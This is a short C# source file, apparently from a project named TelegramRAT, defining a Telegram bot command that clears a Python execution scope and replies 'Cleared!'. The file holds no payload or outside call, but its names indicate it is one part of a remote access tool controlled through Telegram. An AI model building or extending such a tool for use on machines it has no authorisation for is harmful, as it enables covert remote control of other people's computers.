using Telegram.Bot;
using TelegramRAT.Services;

namespace TelegramRAT.Commands.Misc;

public class PyClearScopeCommand(ITelegramBotClient botClient, IPythonService pythonService) : AbstractBotCommand
{
    public override string Command => "pyclearscope";
    public override int ArgsCount => 0;
    public override string Description => "Clear python execution scope.";

    public override async Task ExecuteAsync(BotCommandModel model)
    {
        if (model.Message == null) return;

        pythonService.ClearScope();
        await botClient.SendMessage(model.Message.Chat.Id, "Cleared!", replyParameters: new Telegram.Bot.Types.ReplyParameters { MessageId = model.Message.MessageId });
    }
}
